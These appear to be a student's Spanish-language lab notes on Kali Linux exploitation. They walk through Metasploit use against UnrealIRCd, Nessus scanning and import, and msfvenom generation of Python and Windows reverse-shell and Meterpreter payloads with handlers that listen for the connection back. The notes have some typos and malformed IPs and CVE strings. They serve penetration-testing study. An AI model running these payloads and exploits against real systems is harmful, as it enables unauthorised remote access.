# KALI - Explotación de vulnerabilidades

## Metasploit

- Estructura de ficheros
  - se instala en /usr/share/metasploit-framework
  - tiene varios módulos, plugins (como el de unir metasploit con nessus), scripts, librerías
  - en /modules tenemos
    - auxiliares (scaneo de puertos, sniffing, herramientas para reconocimiento activo)
    - codificadores (para que el payload se codifique bien, etc)
    - evasion
    - exploits
    - nops
    - payloads
    - post
- /exploits y /payloads son los que nos interesan
- Puedo usar cat para visualiar el contenido del exploit
- En /payloads tenemos 
- singles, payloads autocontenidos, no necesitan metasploit, puedo usar netcat
- stagers, payloads pequeños que establecen conexión con una máquina y devuelven una conexión reversa. 
    - Luego aprovecha un stages para realizar una acción
- stages, el conocido meterpreter (hay otros)
- Stagers establecen la conexión y usan stages para establecer la consola con más funcionalidades
- Con msfconsole inicio metasploit

> msfconsole
-------

## Explotación básica

- con Nessus start levanta el daemon de Nessus
- https://kali:8834 para la UI de Nessus
- Si da error, en el navegador/Preferencias/Privacidad y seguridad/Cookies and Side data/ CLEAR DATA
- Actualizar la página y se arregla
- New Scan, le marco los targets con IP's
- Exporto el reporte como html, puedo abrirlo con firefox
- Entro en metasploit
- Para actualizar msfupdate
- Recomendación: si usas el help centarrse en los comandos core, hay mucha información
- connect es parecido a netcat para establecer conexiones TCP
- Para que netcat se quedara escuchando en el puerto 444 lo escribiría asi

> nc -l -p 444

- Puedo conectarme a mi mismpo desde otra consola
> connect 127.0.0.1:444

- Para buscar un exploit uso search

> search unrealirc

- Para usar el exploit

> use exploit/unix/irc/unreal_ircd_
> msf exploit (unix/irc/unreal)> show options (opciones de config)
> msf exploit (unix/irc/unreal)> show advanced (+ opciones)
> msf exploit (unix/irc/unreal)> show payloads (me muestra payloads compatibles con mi exploit)
> msf exploit (unix/irc/unreal)> set payload cmd/unix/reverse
> msf exploit (unix/irc/unreal)> show options (para ver las opciones del payload también)

- En el payload me pide el LHOST (la ip del listener) y el LPORT (el puerto)

> msf exploit (unix/irc/unreal)> set lhost 192.168.1.13
> msf exploit (unix/irc/unreal)> set lport 444
> msf exploit (unix/irc/unreal)> exploit

- Estoy dentro!
-----

## Explotación avanzada

- En ocasiones hay que modificar el exploit
- 
------

## Msfvenom - generador de payloads

> msfvenom -h //para la ayuda

- Si quiero generar un payload que me devuelva una conexión netcat usaré un single
- En single/python tengo, por ejemplo, shell_reverse_tcp.rb
- Uso -p para indicarle el path del payload y le paso mi ip y un puerto

> msfvenom -p python/shell_reverse_tcp lhost=192.168.16-130 lport=444

- Al final del mensaje hay como un token que empieza con exec, ese es el payload
- Debo introducirlo en el exploit
- Hay que escapar las comillas simples con una barra invertida primero \' y añadir al exploit
> python_payload= f'python -c "exec(\'sdksajslaksja \.decode(\'base64\'))"'

- Puedo generar un nuevo payload para establecer un meterpreter con mi ip y el puerto

> msfvenom  -p python/meterpreter/reverse_tcp lhost=192.168.16.130 lport=444

- Una vez establecida la conexion reversa, se descargará el stage y lo ejecutará para abrir un meterpreter
- Hago lo mismo, lo pego en el exploit
- Esto nos devolverá un meterpreter, necesitaré un handler para poner un listener para recibir la conexión


> msf> use exploit/multi/handler
> msf> set lhost mi_IP (192.168.1.13) 
> msf> set lport 444 
> msf> set payload python/meterpreter/reverse_tcp (el payload que haya creado con msfvenom)
> exploit (se queda a la escxucha)

- Lanzo el exploit a la ip objetivo
> ./exploit.py 192.128.1.25n 667 -- payload python_payload (nombre del payload que introduje en el exploit generado por msfvenom)

- Generar payloaad para windows es sencillo generando un .exe con -f (formato)

> msfvenom -p windows/meterpreter/reverse_tcp lhost=mi_IP lport=444 -f exe > prueba.exe

- Debo usar un handler que poner a la escucha para recibir el meterpreter, como hice anteriormente
-----

## Metasploit: importando los resultados de Nessus

- Para usar la integración de Nessus en metasploit inicio Nessus
- Para cargar un plugins
> msf> load nessus
> msf> nessus help

- debo usar nessus_connect y luego todo lo demás
- Es más sencillo gestionarlo desde la UI de Nessus
- Hacemos el reporte con Nessus y lo exportamos como .nessus
- Una vez exportado, desde metasploit lo puedo importar

> msf db_import /home/hali/desktop/escaneo.nessus

- Ahora puedo interactuar con la db de metasploit usando los resultados de nessus
>msf>hosts (para ver los targets)
>msf> services 192.168.1.29 (para ver los puertos y servicios del hosty target en el resultado de nessus)

>msf> help vulns
- Para buscar vulnerabilidades en los host target asociadas a un puerto 

>msf> vulns -p 21

- Me lista las vulnerabilidades encontradas en el host asociadas al puerto 21, además de info
- Con vulns y la ip del host atacado me muestra todas las vulnerabilidades

>msf> vulns 192.168.1.29

- Puedo buscar por CVE delos resultados de la última columna en la consola de metasploit

>msf> search cve:213-345

- Puedo acceder al primer resultado de la búsqueda usando el número de indice

> msf> use 0